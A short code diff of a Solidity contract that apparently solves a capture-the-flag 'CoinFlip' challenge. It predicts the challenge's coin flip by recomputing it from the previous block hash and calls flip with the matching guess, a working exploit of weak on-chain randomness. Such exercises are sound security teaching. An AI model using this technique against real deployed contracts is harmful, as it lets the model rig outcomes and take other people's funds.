@@ -2,20 +2,30 @@
 pragma solidity ^0.8.12;
 
 import "./CoinFlip.sol";
+import "../test/console.sol";
+
+interface ICoinFlipChallenge {
+    function flip(bool _guess) external returns (bool);
+}
 
 contract CoinFlipSolution {
-    CoinFlip public coinFlip;
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    ICoinFlipChallenge public challenge;
 
-    constructor(address levelAddress) {
-        coinFlip = CoinFlip(levelAddress);
+    constructor(address challengeAddress) {
+        challenge = ICoinFlipChallenge(challengeAddress);
     }
 
     function solve() external payable {
+        // simulate the same what the challenge contract does
         uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 flip = blockValue / FACTOR;
-        bool side = flip == 1;
+        console.log(blockValue);
 
-        coinFlip.flip(side);
+        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        bool side = coinFlip == 1 ? true : false;
+
+        // call challenge contract with same guess
+        challenge.flip(side);
     }
+
+    fallback() external payable {}
 }
